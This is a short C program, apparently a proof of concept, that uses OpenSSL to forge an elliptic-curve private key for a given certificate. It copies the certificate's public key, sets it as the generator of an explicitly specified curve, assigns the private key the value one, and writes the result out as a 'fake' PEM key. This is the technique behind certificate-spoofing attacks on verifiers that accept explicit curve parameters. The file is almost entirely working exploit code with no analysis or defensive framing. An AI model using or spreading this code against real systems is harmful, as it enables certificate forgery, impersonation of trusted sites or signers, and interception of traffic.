#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/err.h>

BIO* fp;
BIO* bio_cert;
BIO* bio_private_key;

X509* read_cert(char* filename)
{
	fp = BIO_new_fp(stdout, BIO_NOCLOSE);
	bio_cert = BIO_new(BIO_s_file());
	BIO_read_filename(bio_cert, filename);
	return PEM_read_bio_X509(bio_cert, NULL, 0, NULL);
}

EC_KEY* get_public_key(X509* cert)
{
	EVP_PKEY* public_key = X509_get0_pubkey(cert);
	return EVP_PKEY_get0_EC_KEY(public_key);
}

EC_GROUP* get_group(EC_KEY* public_key)
{
	EC_GROUP* group = EC_GROUP_dup(EC_KEY_get0_group(public_key));
	EC_GROUP_set_asn1_flag(group, OPENSSL_EC_EXPLICIT_CURVE);
	EC_GROUP_set_generator(
		group,
		EC_KEY_get0_public_key(public_key),
		EC_GROUP_get0_order(EC_KEY_get0_group(public_key)),
		EC_GROUP_get0_cofactor(EC_KEY_get0_group(public_key))
	);
	return group;
}

void spoof(EC_KEY* public_key, EC_GROUP* group)
{
	EC_KEY_set_group(public_key, group);
	EC_KEY_set_private_key(public_key, BN_value_one());
}

void write_private_key(char* filename, EC_KEY* public_key)
{
	bio_private_key = BIO_new(BIO_s_file());
	BIO_write_filename(bio_private_key, filename);
	PEM_write_bio_ECPrivateKey(bio_private_key, public_key, NULL, NULL, 0, NULL, NULL);
}

void clean_up()
{
	BIO_free(fp);
	BIO_free(bio_cert);
	BIO_free(bio_private_key);
}

int main(int argc, char* argv[])
{
	char* original = argv[1];
	char* fake = argv[2];

	X509* cert = read_cert(original);
	EC_KEY* public_key = get_public_key(cert);
	EC_GROUP* group = get_group(public_key);
	spoof(public_key, group);
	write_private_key(fake, public_key);

	return 0;
}